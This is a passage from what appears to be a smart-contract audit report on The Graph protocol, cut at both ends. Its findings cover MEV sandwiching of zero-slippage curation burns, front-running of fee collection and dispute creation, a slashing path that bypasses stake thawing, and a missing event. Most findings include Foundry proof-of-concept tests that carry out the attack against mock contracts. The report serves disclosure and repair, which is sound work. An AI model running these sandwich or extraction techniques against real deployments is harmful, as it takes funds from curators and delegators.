The inherited L1GNS lifecycle flows burn or remint the subgraph's entire curation position with a hard-coded minimum of zero. In publishNewVersion(), the old deployment is burned with minOut=0 and the new deployment is minted with minOut=0. deprecateSubgraph() and sendSubgraphToL2() also burn all vSignal with minOut=0. Vulnerable snippets: `uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);`, `(subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);`, and `uint256 curationTokens = curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);`. Because curation is an external bonding-curve market, a mempool searcher can sell into the same deployment immediately before the owner lifecycle transaction, depressing the burn output, then buy back after the protocol-sized burn. The loss is socialized across the subgraph's curators through reduced `withdrawableGRT`, reduced `tokensForL2`, or reduced value rolled into the new deployment.

## Impact
A permissionless MEV searcher can extract GRT from large curated subgraphs during owner lifecycle operations. If the subgraph's curated value is large, this can cause significant user funds to be lost from the curation position and transferred to the attacker through bonding-curve price manipulation.

## Proof of Concept
1. A valuable subgraph has a large vSignal position held by GNS. 2. The owner submits publishNewVersion(), deprecateSubgraph(), or sendSubgraphToL2(). 3. The attacker observes the transaction and front-runs by burning/selling their own signal in the same deployment, lowering the bonding-curve price. 4. The owner transaction executes with minOut=0, accepting the depressed output for the entire GNS-held position. 5. The attacker back-runs by buying signal back at the lower post-burn price, keeping the arbitrage profit while curators receive fewer GRT or less L2 value.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract MockCuration { uint256 public tokenReserve = 1000 ether; uint256 public signalReserve = 1000 ether; mapping(address => uint256) public sig; constructor(){ sig[address(0xBEEF)] = 500 ether; sig[address(0xA11CE)] = 300 ether; } function quoteBurn(uint256 s) external view returns (uint256){ return s * tokenReserve / (signalReserve + s); } function burn(address from,uint256 s,uint256 minOut) external returns (uint256 out){ require(sig[from] >= s, "no sig"); out = s * tokenReserve / (signalReserve + s); require(out >= minOut, "slip"); sig[from] -= s; signalReserve += s; tokenReserve -= out; } function mint(address to,uint256 t,uint256 minSig) external returns (uint256 out){ out = t * signalReserve / (tokenReserve + t); require(out >= minSig, "slip"); sig[to] += out; signalReserve -= out; tokenReserve += t; } }
contract VulnerableGNS { MockCuration public c; uint256 public vSignal = 500 ether; uint256 public lastTokens; constructor(MockCuration _c){ c = _c; } function publishNewVersion() external { lastTokens = c.burn(address(0xBEEF), vSignal, 0); vSignal = 0; } }
contract L1GNSSlippagePoC is Test { function testZeroMinOutLifecycleBurnCanBeSandwiched() external { MockCuration c1 = new MockCuration(); uint256 fairOut = c1.quoteBurn(500 ether); MockCuration c2 = new MockCuration(); VulnerableGNS gns = new VulnerableGNS(c2); uint256 attackerStart = c2.sig(address(0xA11CE)); uint256 frontRunTokens = c2.burn(address(0xA11CE), 300 ether, 0); gns.publishNewVersion(); c2.mint(address(0xA11CE), frontRunTokens, 0); assertGt(fairOut, gns.lastTokens(), "victim accepted worse execution because minOut was zero"); assertGt(c2.sig(address(0xA11CE)), attackerStart, "attacker profits from sandwich"); } }

## Suggested Mitigation
Expose and enforce user-supplied minimums for every lifecycle curation burn and mint, e.g. `_tokensOutMin` for old-deployment burns and `_vSignalOutMin` for new-deployment mints. For owner-only lifecycle calls affecting pooled curator value, require the owner to submit bounded slippage parameters and revert if curation output is below the bound. Consider using commit/reveal or private orderflow for high-value migrations.


## [M-71]. Live thawingPeriod changes can trap existing HorizonStaking delegators in a longer withdrawal delay

## id: -MTK0MGT9nO7ufWzFQ7V1

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
HorizonStaking.setProvisionParameters/acceptProvisionParameters/_undelegate

## Finding Status: Valid
### Finding Status Justification: The core live-parameter issue exists in in-scope HorizonStaking. Existing delegations do not store thawingPeriod snapshots, while _undelegate() reads _provisions[serviceProvider][verifier].thawingPeriod at exit time. setProvisionParameters() can stage a longer period within _maxThawingPeriod and acceptProvisionParameters() can apply it without a delay or old-terms grace path. acceptProvisionParameters() also does not revalidate thawingPeriodPending against the current _maxThawingPeriod, so the pending-value variant is mechanically present, though the global max reduction itself is governance-controlled. The main exploit path only requires ordinary provider/verifier actions, not admin compromise, and no complete safeguard is shown.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
Existing delegators do not snapshot the provision thawing period when they delegate. Instead, the exit path reads the provision's live thawingPeriod when undelegate() is called. A service provider or authorized operator can stage a longer thawing period and the verifier can accept it immediately, with no grace period for existing delegators to exit under the terms they entered. The same missing revalidation also lets a provider stage a high thawingPeriod before governance lowers _maxThawingPeriod; acceptProvisionParameters() later applies the now-out-of-policy pending value because it does not re-check the global maximum.

Vulnerable snippets:

function setProvisionParameters(..., uint64 newThawingPeriod) external override notPaused onlyAuthorized(serviceProvider, verifier) {
    require(newThawingPeriod <= _maxThawingPeriod, HorizonStakingInvalidThawingPeriod(newThawingPeriod, _maxThawingPeriod));
    prov.thawingPeriodPending = newThawingPeriod;
    prov.lastParametersStagedAt = block.timestamp;
}

function acceptProvisionParameters(address serviceProvider) external override notPaused {
    address verifier = msg.sender;
    Provision storage prov = _provisions[serviceProvider][verifier];
    prov.thawingPeriod = prov.thawingPeriodPending;
}

function _undelegate(address _serviceProvider, address _verifier, uint256 _shares) private returns (bytes32) {
    uint64 thawingUntil = uint64(block.timestamp + uint256(_provisions[_serviceProvider][_verifier].thawingPeriod));
    ...
}

## Impact
Delegators who entered a provision under a short withdrawal delay can have their undelegation delay extended to the maximum allowed period without an exit window. If governance previously allowed a very large maxThawingPeriod, or if a high value is staged immediately before governance reduces the maximum, delegated GRT can be functionally frozen for far longer than users agreed to. This is a liveness/fund-freeze issue rather than direct theft.

## Proof of Concept
1. A service provider creates a provision with a 1 day thawingPeriod and attracts delegators.
2. A victim delegates GRT to that provision.
3. The service provider stages a new thawingPeriod equal to the current maxThawingPeriod.
4. The verifier calls acceptProvisionParameters() immediately, in the same block if desired.
5. The victim calls undelegate(); _undelegate() reads the live provision thawingPeriod and creates a thaw request expiring at block.timestamp + the new long delay.
6. The victim cannot withdrawDelegated() until that longer timestamp, even though their delegation was made under the original short delay.
7. Variant: if governance is lowering _maxThawingPeriod, the provider can stage the old high value before the governance transaction; acceptProvisionParameters() can apply it after the max is lowered because it does not revalidate pending thawingPeriod.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

contract HorizonStakingThawHarness {
    struct Provision {
        uint64 thawingPeriod;
        uint64 thawingPeriodPending;
        uint64 createdAt;
    }

    mapping(address => mapping(address => Provision)) public provisions;
    mapping(address => mapping(address => mapping(address => uint256))) public shares;
    mapping(address => mapping(address => mapping(address => uint64))) public thawingUntil;
    uint64 public maxThawingPeriod = 365 days;

    modifier onlyAuthorized(address serviceProvider) {
        require(msg.sender == serviceProvider, "not authorized");
        _;
    }

    function createProvision(address serviceProvider, address verifier, uint64 thawingPeriod) external {
        require(thawingPeriod <= maxThawingPeriod, "bad thaw");
        provisions[serviceProvider][verifier] = Provision({
            thawingPeriod: thawingPeriod,
            thawingPeriodPending: thawingPeriod,
            createdAt: uint64(block.timestamp)
        });
    }

    function delegate(address serviceProvider, address verifier, uint256 amount) external {
        require(provisions[serviceProvider][verifier].createdAt != 0, "invalid provision");
        shares[serviceProvider][verifier][msg.sender] += amount;
    }

    function setMaxThawingPeriod(uint64 newMax) external {
        maxThawingPeriod = newMax;
    }

    function setProvisionParameters(address serviceProvider, address verifier, uint64 newThawingPeriod) external onlyAuthorized(serviceProvider) {
        require(newThawingPeriod <= maxThawingPeriod, "above max");
        provisions[serviceProvider][verifier].thawingPeriodPending = newThawingPeriod;
    }

    function acceptProvisionParameters(address serviceProvider) external {
        Provision storage prov = provisions[serviceProvider][msg.sender];
        require(prov.createdAt != 0, "invalid provision");
        prov.thawingPeriod = prov.thawingPeriodPending;
    }

    function undelegate(address serviceProvider, address verifier, uint256 amount) external {
        require(shares[serviceProvider][verifier][msg.sender] >= amount, "insufficient shares");
        shares[serviceProvider][verifier][msg.sender] -= amount;
        thawingUntil[serviceProvider][verifier][msg.sender] = uint64(block.timestamp) + provisions[serviceProvider][verifier].thawingPeriod;
    }
}

contract HorizonStakingThawPeriodMidFlowPoC is Test {
    HorizonStakingThawHarness staking;
    address serviceProvider = address(0xA11CE);
    address verifier = address(0xB0B);
    address delegator = address(0xCAFE);

    function setUp() public {
        staking = new HorizonStakingThawHarness();
        staking.createProvision(serviceProvider, verifier, 1 days);
    }

    function testExistingDelegatorGetsLongerLiveThawingPeriod() public {
        vm.prank(delegator);
        staking.delegate(serviceProvider, verifier, 1_000 ether);

        vm.prank(serviceProvider);
        staking.setProvisionParameters(serviceProvider, verifier, 365 days);
        vm.prank(verifier);
        staking.acceptProvisionParameters(serviceProvider);

        uint256 beforeExit = block.timestamp;
        vm.prank(delegator);
        staking.undelegate(serviceProvider, verifier, 1_000 ether);

        uint64 exitTime = staking.thawingUntil(serviceProvider, verifier, delegator);
        assertEq(exitTime, beforeExit + 365 days);
        assertGt(exitTime, beforeExit + 1 days);
    }

    function testPendingHighThawBypassesLaterMaxReduction() public {
        vm.prank(serviceProvider);
        staking.setProvisionParameters(serviceProvider, verifier, 365 days);

        staking.setMaxThawingPeriod(7 days);

        vm.prank(verifier);
        staking.acceptProvisionParameters(serviceProvider);

        (uint64 activeThaw,,) = staking.provisions(serviceProvider, verifier);
        assertEq(activeThaw, 365 days);
        assertGt(activeThaw, staking.maxThawingPeriod());
    }
}

## Suggested Mitigation
Snapshot the applicable thawingPeriod per delegator deposit or per delegation share lot, and use the snapshot when undelegating. Alternatively, introduce a mandatory timelock/grace period for thawingPeriod increases so existing delegators can exit under the previous value. Also revalidate prov.thawingPeriodPending <= _maxThawingPeriod inside acceptProvisionParameters() before applying pending parameters.


## [H-72]. Fee collect can be front-run to capture already-accrued curation fees in L2Curation.collect

## id: OJlNnyFbndyJ-aX8sExbp

## Derived From Pattern/Invariant
FeeAccountingDrift

## Exploit Type
FrontrunMev

## Location
L2Curation.collect

## Finding Status: Valid
### Finding Status Justification: The finding accurately describes L2Curation's current reserve-share accounting. collect is an external in-scope function that, after caller and isCurated checks, simply adds _tokens to curationPool.tokens. mint can create GCS immediately before that reserve increase, and burn can redeem immediately afterward using signalToTokens over the post-collect reserve. No code snapshots holders at fee accrual or pre-collect time, and there is no holding-period, cooldown, or reward accumulator excluding newly minted signal. The authorized-caller check on collect does not fully block this path because the attack can surround a normal authorized collect rather than call collect directly. No explicit design documentation accepts this fee-sandwich risk. The root cause exists in today's code and is realistically reachable when pending collections can be observed or predicted.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`collect()` books a fee amount directly into `pools[_subgraphDeploymentID].tokens` and therefore raises the redemption price for whoever holds GCS at the moment of collection, not whoever held GCS while the fees were earned. A permissionless searcher can mint immediately before an observable authorized `collect()` transaction and burn immediately after it, receiving a pro-rata share of the collected fees despite not providing curation during the fee accrual period.

Vulnerable snippets:

`function collect(bytes32 _subgraphDeploymentID, uint256 _tokens) external override { require(msg.sender == subgraphService || msg.sender == address(staking()), "Caller must be the subgraph service or staking contract"); require(isCurated(_subgraphDeploymentID), "Subgraph deployment must be curated to collect fees"); CurationPool storage curationPool = pools[_subgraphDeploymentID]; curationPool.tokens = curationPool.tokens.add(_tokens); emit Collected(_subgraphDeploymentID, _tokens); }`

`mint()` then mints signal against the pre-collection reserve, while `burn()` redeems against the post-collection reserve. With pool reserves `T`, attacker post-tax deposit `A`, and pending fees `F`, the attacker can redeem roughly `A + F * A / (T + A)`, so profit is possible whenever the captured fee share exceeds curation tax and gas. Existing curators receive only the remaining fee share, so fee value is transferred from legitimate holders to the searcher.

## Impact
A permissionless MEV searcher can steal a pro-rata portion of large pending GRT fee collections from existing curators. For sufficiently large collects, this can cause significant user funds or unclaimed fee yield to be lost directly from the L2Curation reserve accounting to the attacker.

## Proof of Concept
1. A deployment already has existing curators and pending query fees have been transferred or are about to be booked through the authorized `collect()` path.
2. A searcher observes the pending `collect(subgraphDeploymentID, fees)` transaction.
3. The searcher front-runs with `mint(subgraphDeploymentID, largeAmount, 0)`, receiving GCS priced before the fee reserve increase.
4. The authorized `collect()` executes and increases `curationPool.tokens` without minting new GCS or using any time-weighted/snapshot accounting.
5. The searcher back-runs with `burn(subgraphDeploymentID, attackerSignal, 0)` and receives their pro-rata share of the newly booked fees.
6. Existing curators receive less of the collected fees even though the attacker was not a curator during the fee accrual period.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockGRT {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }
}

contract MockGCS {
    address public immutable curation;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address curation_) {
        curation = curation_;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == curation, "only curation");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burnFrom(address from, uint256 amount) external {
        require(msg.sender == curation, "only curation");
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract L2CurationLike {
    uint32 private constant MAX_PPM = 1_000_000;
    uint256 private constant SIGNAL_PER_MINIMUM_DEPOSIT = 1;

    struct Pool {
        uint256 tokens;
        MockGCS gcs;
    }

    MockGRT public immutable grt;
    address public immutable collector;
    uint32 public curationTaxPercentage = 10_000;
    uint256 public minimumCurationDeposit = 1e18;
    mapping(bytes32 => Pool) public pools;

    constructor(MockGRT grt_, address collector_) {
        grt = grt_;
        collector = collector_;
    }

    function mint(bytes32 id, uint256 tokensIn, uint256 signalOutMin) external returns (uint256 signalOut, uint256 tax) {
        (signalOut, tax) = tokensToSignal(id, tokensIn);
        require(signalOut >= signalOutMin, "slippage");
        Pool storage p = pools[id];
        if (address(p.gcs) == address(0)) p.gcs = new MockGCS(address(this));
        require(grt.transferFrom(msg.sender, address(this), tokensIn), "transferFrom");
        grt.burn(tax);
        p.tokens += tokensIn - tax;
        p.gcs.mint(msg.sender, signalOut);
    }

    function collect(bytes32 id, uint256 tokens) external {
        require(msg.sender == collector, "only collector");
        require(pools[id].tokens != 0, "not curated");
        pools[id].tokens += tokens;
    }

    function burn(bytes32 id, uint256 signalIn, uint256 tokensOutMin) external returns (uint256 tokensOut) {
        Pool storage p = pools[id];
        tokensOut = signalToTokens(id, signalIn);
        require(tokensOut >= tokensOutMin, "slippage");
        p.tokens -= tokensOut;
        p.gcs.burnFrom(msg.sender, signalIn);
        if (p.gcs.totalSupply() == 0) p.tokens = 0;
        require(grt.transfer(msg.sender, tokensOut), "transfer");
    }

    function tokensToSignal(bytes32 id, uint256 tokensIn) public view returns (uint256 signalOut, uint256 tax) {
        uint256 afterTax = uint256(MAX_PPM - curationTaxPercentage) * tokensIn / MAX_PPM;
        tax = tokensIn - afterTax;
        signalOut = _tokensToSignal(id, afterTax);
    }

    function signalToTokens(bytes32 id, uint256 signalIn) public view returns (uint256) {
        Pool storage p = pools[id];
        require(p.tokens != 0, "not curated");
        require(p.gcs.totalSupply() >= signalIn, "too much signal");
        return p.tokens * signalIn / p.gcs.totalSupply();
    }

    function balanceOf(bytes32 id, address account) external view returns (uint256) {
        return pools[id].gcs.balanceOf(account);
    }

    function _tokensToSignal(bytes32 id, uint256 tokensIn) internal view returns (uint256) {
        Pool storage p = pools[id];
        if (p.tokens == 0) {
            require(tokensIn >= minimumCurationDeposit, "below minimum");
            return SIGNAL_PER_MINIMUM_DEPOSIT + SIGNAL_PER_MINIMUM_DEPOSIT * (tokensIn - minimumCurationDeposit) / minimumCurationDeposit;
        }
        return p.gcs.totalSupply() * tokensIn / p.tokens;
    }
}

contract L2CurationFeeTimingPOC is Test {
    MockGRT grt;
    L2CurationLike curation;
    address victim = address(0xA11CE);
    address attacker = address(0xB0B);
    bytes32 id = keccak256("deployment");

    function setUp() public {
        grt = new MockGRT();
        curation = new L2CurationLike(grt, address(this));
    }

    function testFrontRunCollectCapturesPendingFees() public {
        uint256 initialDeposit = 1_000_000e18;
        uint256 attackerDeposit = 1_000_000e18;
        uint256 pendingFees = 100_000e18;

        grt.mint(victim, initialDeposit);
        vm.startPrank(victim);
        grt.approve(address(curation), initialDeposit);
        curation.mint(id, initialDeposit, 0);
        vm.stopPrank();

        uint256 victimRedeemableBefore = curation.signalToTokens(id, curation.balanceOf(id, victim));
        assertEq(victimRedeemableBefore, 990_000e18);

        grt.mint(address(curation), pendingFees);

        grt.mint(attacker, attackerDeposit);
        uint256 attackerBalanceBefore = grt.balanceOf(attacker);
        vm.startPrank(attacker);
        grt.approve(address(curation), attackerDeposit);
        curation.mint(id, attackerDeposit, 0);
        vm.stopPrank();

        curation.collect(id, pendingFees);

        uint256 attackerSignal = curation.balanceOf(id, attacker);
        vm.prank(attacker);
        curation.burn(id, attackerSignal, 0);

        uint256 attackerProfit = grt.balanceOf(attacker) - attackerBalanceBefore;
        assertEq(attackerProfit, 40_000e18);
        assertGt(attackerProfit, 0);

        uint256 victimRedeemableAfter = curation.signalToTokens(id, curation.balanceOf(id, victim));
        assertEq(victimRedeemableAfter - victimRedeemableBefore, 50_000e18);
    }
}


## Suggested Mitigation
Do not distribute a collection solely to current GCS holders at execution time. Snapshot eligible pool signal before the fee accrual/settlement period, distribute fees through a reward index based on time- or epoch-weighted signal, or make fee collection atomic with the fee source in a way that cannot be profitably sandwiched. At minimum, introduce a collection delay/snapshot boundary so newly minted GCS after the snapshot cannot claim already-accrued fees.


## [H-73]. Verifier reward path lets colluding verifier bypass HorizonStaking.slash thawing and extract provisioned GRT

## id: jdzPwaYmWyMGmgtPKXrKl

## Derived From Pattern/Invariant
CrossRoleCollusionWithoutSlashing

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
HorizonStaking.slash

## Finding Status: Valid
### Finding Status Justification: The relevant code path exists in in-scope HorizonStaking. _createProvision() and setProvisionParameters() accept any valid PPM value, and PPMMath.isValidPPM allows 1,000,000. slash() computes maxVerifierTokens = providerTokensSlashed.mulPPM(prov.maxVerifierCut), transfers tokensVerifier to verifierDestination if within that cap, and burns providerTokensSlashed - tokensVerifier. With maxVerifierCut at 100%, tokensVerifier can equal providerTokensSlashed, causing an immediate transfer and zero burn. There is no evidence requirement, no thawing-period check in slash(), and no cap below 100%, so no complete safeguard blocks the stated path. It is not explicitly documented as an accepted instant-withdrawal mechanism. The path is currently reachable by a provision's verifier, with provider/verifier collusion or shared control; these are not necessarily trusted governance roles.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
A verifier can redirect up to `prov.maxVerifierCut` of slashed provider stake to any `verifierDestination`. Because `_createProvision()` and `setProvisionParameters()` allow `maxVerifierCut` up to 1,000,000 PPM, a provider and verifier can configure a 100% verifier cut and then call `slash()` with `tokensVerifier == providerTokensSlashed`. In that case no GRT is burned and the provisioned stake is transferred immediately to an arbitrary liquid address, bypassing the provision thawing period and, for locked provisions, defeating the purpose of restricting locked-token provisions to allowed verifiers.

Vulnerable snippets:
`require(PPMMath.isValidPPM(_maxVerifierCut), HorizonStakingInvalidMaxVerifierCut(_maxVerifierCut));`

`uint256 maxVerifierTokens = providerTokensSlashed.mulPPM(prov.maxVerifierCut); require(maxVerifierTokens >= tokensVerifier, HorizonStakingTooManyTokens(tokensVerifier, maxVerifierTokens)); if (tokensVerifier > 0) { _graphToken().pushTokens(verifierDestination, tokensVerifier); } _graphToken().burnTokens(providerTokensSlashed - tokensVerifier);`

When `prov.maxVerifierCut == 1_000_000`, `providerTokensSlashed - tokensVerifier` can be zero, so the slash becomes an immediate transfer instead of a penalty.

## Impact
A service provider and verifier can remove provisioned GRT without waiting for the configured thawing period. In locked-token provision flows this can convert restricted locked stake into liquid GRT sent to an arbitrary destination, undermining locked-token custody and stake-security assumptions.

## Proof of Concept
1. A service provider creates or updates a provision with `maxVerifierCut = 1_000_000` and a nonzero `thawingPeriod`.
2. The verifier accepts the provision parameters if they were staged.
3. Instead of calling `thaw()` and waiting for `thawingPeriod`, the verifier calls `slash(serviceProvider, amount, amount, attackerDestination)`.
4. `slash()` computes `maxVerifierTokens == amount`, sends `amount` GRT to `attackerDestination`, burns zero tokens, and reduces the provider's provision accounting.
5. The provisioned stake has been extracted immediately, bypassing the intended thawing delay.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

contract MockGraphToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function pushTokens(address to, uint256 amount) external { balanceOf[to] += amount; }
    function burnTokens(uint256) external {}
}

contract HorizonStakingSlashModel {
    uint256 constant MAX_PPM = 1_000_000;
    MockGraphToken public token;
    struct Provision { uint256 tokens; uint32 maxVerifierCut; }
    mapping(address => mapping(address => Provision)) public provisions;

    constructor(MockGraphToken token_) { token = token_; }

    function createProvision(address serviceProvider, address verifier, uint256 tokens, uint32 maxVerifierCut) external {
        require(maxVerifierCut <= MAX_PPM, "invalid ppm");
        provisions[serviceProvider][verifier] = Provision(tokens, maxVerifierCut);
    }

    function slash(address serviceProvider, uint256 tokens, uint256 tokensVerifier, address verifierDestination) external {
        Provision storage prov = provisions[serviceProvider][msg.sender];
        uint256 providerTokensSlashed = tokens < prov.tokens ? tokens : prov.tokens;
        uint256 maxVerifierTokens = providerTokensSlashed * prov.maxVerifierCut / MAX_PPM;
        require(maxVerifierTokens >= tokensVerifier, "too many verifier tokens");
        if (tokensVerifier > 0) token.pushTokens(verifierDestination, tokensVerifier);
        token.burnTokens(providerTokensSlashed - tokensVerifier);
        prov.tokens -= providerTokensSlashed;
    }
}

contract HorizonStakingVerifierCutBypassTest is Test {
    function testVerifierCutCanTransferEntireProvisionWithoutBurningOrThawing() public {
        address provider = address(0x1000);
        address verifier = address(0x2000);
        address destination = address(0x3000);
        uint256 provisioned = 1_000_000 ether;

        MockGraphToken token = new MockGraphToken();
        HorizonStakingSlashModel staking = new HorizonStakingSlashModel(token);
        staking.createProvision(provider, verifier, provisioned, 1_000_000);

        vm.prank(verifier);
        staking.slash(provider, provisioned, provisioned, destination);

        assertEq(token.balanceOf(destination), provisioned);
        (uint256 remaining,) = staking.provisions(provider, verifier);
        assertEq(remaining, 0);
    }
}

## Suggested Mitigation
Do not allow 100% verifier cuts for slash rewards. Enforce a strict protocol-level cap below 100%, and for `provisionLocked()` either require `maxVerifierCut == 0`, send verifier rewards back into the locked wallet under the same restrictions, or route rewards through a lock-preserving escrow. Consider adding verifier bonds/slashing or dispute evidence requirements so collusive false slashing cannot be used as an instant withdrawal path.


## [L-74]. Missing DisputeDrawn event for related conflict in DisputeManager.drawDispute desynchronizes dispute status indexers

## id: o8ZxQ3YqGTr7FIb-YG_xl

## Derived From Pattern/Invariant
StandardViolation: every dispute status transition to Drawn must emit a matching DisputeDrawn event

## Exploit Type
StandardViolation

## Location
DisputeManager.drawDispute

## Finding Status: Valid
### Finding Status Justification: The code path exists exactly as described. drawDispute calls _drawDisputeInConflict, which checks the related pending dispute and sets relatedDispute.status to Drawn. The helper emits no DisputeDrawn event, and drawDispute later emits only for the disputeID passed by the arbitrator. Thus storage can show two Drawn disputes while logs show one Drawn event. This occurs in in-scope production code. It requires normal arbitrator resolution of a conflict dispute, not privileged abuse, and no documentation explicitly accepts the event/state divergence.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
When a linked conflict dispute is drawn, drawDispute emits DisputeDrawn only for the dispute ID supplied by the arbitrator. The related dispute is also transitioned to Drawn inside _drawDisputeInConflict, but that state transition has no matching DisputeDrawn event. Vulnerable snippet: function _drawDisputeInConflict(Dispute memory _dispute) private returns (bool) { if (_isDisputeInConflict(_dispute)) { bytes32 relatedDisputeID = _dispute.relatedDisputeID; Dispute storage relatedDispute = disputes[relatedDisputeID]; relatedDispute.status = IDisputeManager.DisputeStatus.Drawn; return true; } return false; }. This violates the event/status invariant for conflict disputes and makes event-only consumers observe only one terminal transition while storage contains two.

## Impact
Off-chain dispute processors, subgraphs, accounting jobs, or arbitration dashboards that reconcile status from DisputeDrawn events can continue treating the related dispute as Pending even though on-chain storage marks it Drawn. This is an event-consistency and integration correctness issue; conflict deposits are zero, so this does not directly steal tokens.

## Proof of Concept
1. A fisherman creates two linked conflicting query disputes, d1 and d2, via createQueryDisputeConflict. 2. Both disputes are Pending and reference each other through relatedDisputeID. 3. The arbitrator calls drawDispute(d1). 4. _drawDisputeInConflict sets disputes[d2].status = Drawn. 5. drawDispute then sets disputes[d1].status = Drawn and emits DisputeDrawn only for d1. 6. Storage shows both d1 and d2 are Drawn, but the transaction logs contain no DisputeDrawn event for d2.

## Proof of Code
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../contracts/disputes/DisputeManager.sol";

contract DisputeManagerHarness is DisputeManager {
    function setArbitratorForTest(address a) external { arbitrator = a; }
    function seedPendingConflict(bytes32 d1, bytes32 d2, address indexer, address fisherman) external {
        disputes[d1] = IDisputeManager.Dispute(indexer, fisherman, 0, d2, IDisputeManager.DisputeType.QueryDispute, IDisputeManager.DisputeStatus.Pending);
        disputes[d2] = IDisputeManager.Dispute(indexer, fisherman, 0, d1, IDisputeManager.DisputeType.QueryDispute, IDisputeManager.DisputeStatus.Pending);
    }
    function statusOf(bytes32 id) external view returns (IDisputeManager.DisputeStatus) { return disputes[id].status; }
}

contract DisputeManagerDrawEventTest is Test {
    event DisputeDrawn(bytes32 indexed disputeID, address indexed indexer, address indexed fisherman, uint256 tokens);

    function testDrawConflictMissesRelatedDisputeDrawnEvent() external {
        DisputeManagerHarness dm = new DisputeManagerHarness();
        address arbitrator = address(0xA11CE);
        address indexer = address(0x1);
        address fisherman = address(0x2);
        bytes32 d1 = keccak256("d1");
        bytes32 d2 = keccak256("d2");

        dm.setArbitratorForTest(arbitrator);
        dm.seedPendingConflict(d1, d2, indexer, fisherman);

        vm.recordLogs();
        vm.prank(arbitrator);
        dm.drawDispute(d1);
        Vm.Log[] memory entries = vm.getRecordedLogs();

        assertEq(uint256(dm.statusOf(d1)), uint256(IDisputeManager.DisputeStatus.Drawn));
        assertEq(uint256(dm.statusOf(d2)), uint256(IDisputeManager.DisputeStatus.Drawn));

        bytes32 drawnTopic = keccak256("DisputeDrawn(bytes32,address,address,uint256)");
        uint256 d1Events;
        uint256 d2Events;
        for (uint256 i = 0; i < entries.length; i++) {
            if (entries[i].topics.length > 1 && entries[i].topics[0] == drawnTopic) {
                if (entries[i].topics[1] == d1) d1Events++;
                if (entries[i].topics[1] == d2) d2Events++;
            }
        }

        assertEq(d1Events, 1);
        assertEq(d2Events, 0);
    }
}

## Suggested Mitigation
Emit DisputeDrawn for the related dispute inside _drawDisputeInConflict when its status is changed, using the related dispute's indexer, fisherman, and deposit. Alternatively, refactor conflict drawing so each terminal status transition goes through one internal helper that both writes status and emits the corresponding event.


## [M-75]. Indexing dispute rewards can be stolen by frontrunning the first dispute for an allocation

## id: dHE718r2of_6A8TKmSTns

## Derived From Pattern/Invariant
FirstOrLastMoverAdvantage

## Exploit Type
FrontrunMev

## Location
DisputeManager._createIndexingDisputeWithAllocation

## Finding Status: Valid
### Finding Status Justification: _createIndexingDisputeWithAllocation computes disputeID solely as keccak256(_allocationID), stores msg.sender as fisherman, and permanently rejects later creations for that allocation once any non-null dispute status exists. createIndexingDispute calldata exposes only allocationID and deposit, so a mempool observer can copy the allocationID, pay the same required deposit, and win first inclusion. There is no commit-reveal, challenger binding, hidden evidence, or slippage/deadline-style protection. This is in the scoped DisputeManager and does not depend on privileged access or user misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Indexing dispute uniqueness is only disputeID = keccak256(abi.encodePacked(_allocationID)). The first transaction for an allocation becomes the sole fisherman and all later transactions revert with Dispute already created. Because createIndexingDispute() takes only the allocationID and a deposit, any mempool observer can copy a challenger's transaction, pay the same deposit first, and capture the fisherman position and eventual slashing reward.

## Impact
Evidence discoverers can lose the entire fisherman reward to a searcher or block builder, while their own transaction reverts. This weakens the dispute incentive mechanism and can redirect substantial slashing rewards from the party that found the invalid POI to a frontrunner.

## Proof of Concept
1. A challenger discovers an invalid POI for allocation A and submits createIndexingDispute(A, deposit). 2. A mempool observer copies A and sends the same call with higher priority. 3. The observer's transaction creates the dispute because the ID only depends on A. 4. The original challenger transaction reverts as a duplicate. 5. If the arbitrator accepts the dispute, the observer receives the deposit refund and fisherman reward.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract MockIndexingDisputeManager {
    enum Status { Null, Pending, Accepted }
    struct Dispute { address fisherman; Status status; }
    mapping(bytes32 => Dispute) public disputes;
    mapping(address => uint256) public rewards;
    function createIndexingDispute(address allocationID, address fisherman) external returns (bytes32 id) {
        id = keccak256(abi.encodePacked(allocationID));
        require(disputes[id].status == Status.Null, "Dispute already created");
        disputes[id] = Dispute(fisherman, Status.Pending);
    }
